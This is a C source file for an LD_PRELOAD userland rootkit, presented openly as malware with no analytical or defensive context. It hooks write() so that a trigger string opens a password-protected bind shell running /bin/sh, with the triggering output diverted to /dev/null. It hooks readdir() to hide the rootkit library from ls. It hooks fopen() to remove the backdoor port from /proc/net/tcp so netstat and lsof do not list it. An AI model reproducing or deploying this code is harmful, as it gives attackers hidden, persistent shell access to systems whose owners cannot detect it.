#include <arpa/inet.h>
#include <dirent.h>
#include <dlfcn.h>
#include <fcntl.h>
#include <netinet/in.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <unistd.h>

#include "constants.h"

void start_bind4() {
	struct sockaddr_in addr;
	addr.sin_family = AF_INET;
	addr.sin_port = htons(BIND_PORT);
	addr.sin_addr.s_addr = INADDR_ANY;

	int sockfd = socket(AF_INET, SOCK_STREAM, 0);

	/* allow reuse of local address */
	const static int optval = 1;
	setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval));

	/* bind socket to local address */
	bind(sockfd, (struct sockaddr*) &addr, sizeof(addr));
	listen(sockfd, 0);

	int client_sockfd = accept(sockfd, NULL, NULL);
	for (int i = 0; i < 3; i++)
		dup2(client_sockfd, i);
	
	char input[30];
	read(client_sockfd, input, sizeof(input));
	input[strcspn(input, "\n")] = '\0';

	if (strcmp(input, BIND_PASSWORD) == 0) {
		execve("/bin/sh", NULL, NULL);
		close(sockfd);
	} else {
		shutdown(client_sockfd, SHUT_RDWR);
		close(sockfd);
	}
}

ssize_t write(int fildes, const void *buf, size_t nbytes) {
	ssize_t (*real_write) (int fildes, const void *buf, size_t nbytes);
	ssize_t result;

	real_write = dlsym(RTLD_NEXT, "write");

	/* Message doesn't conain trigger */
	if (strstr(buf, BIND_TRIGGER) == NULL) {
		return real_write(fildes, buf, nbytes);
	}

	/* write original bytes to /dev/null to hide ouput from log */
	fildes = open("/dev/null", O_WRONLY | O_APPEND);
	result = real_write(fildes, buf, nbytes);

	/* Open the bind shell backdoor */
	start_bind4();

	return result;
}

/* Hide from ls */
struct dirent *(*real_readdir) (DIR *dir);
struct dirent *readdir(DIR *dirp) {
  real_readdir = dlsym(RTLD_NEXT, "readdir");
  struct dirent *dir;
  
  /* finds file that doesn't contain rootkit.so */
  while (dir = real_readdir(dirp))
    if (strstr(dir->d_name, LIBRARY_FILENAME) == 0)
      break;

  return dir;
}

/* Hide from netstat and lsof */
FILE *fopen(const char *pathname, const char *mode) {
    FILE *(*real_fopen) (const char *pathname, const char *mode);
    real_fopen = dlsym(RTLD_NEXT, "fopen");

    /* if file is not important, then return fopen normally */
	/* /proc/net/tcp -> requests info about open ports from OS */
    if (strstr(pathname, "/proc/net/tcp") == NULL)
        return real_fopen(pathname, mode);

  /* convert port to string */
  char S_BIND_PORT[6];
  itoa(BIND_PORT, S_BIND_PORT, 10);

	/* create temporary file to store new return value */
    char line[256];
    FILE *temp = tmpfile();
    FILE *fp = real_fopen(pathname, mode);

	/* copies all lines from original fopen, excluding rootkit port number */
    while (fgets(line, sizeof(line), fp)) {
        /* line doesn't contain rootkit port number */
        if (strstr(line, S_BIND_PORT) == NULL)
            fputs(line, temp);
    }

    return temp;
}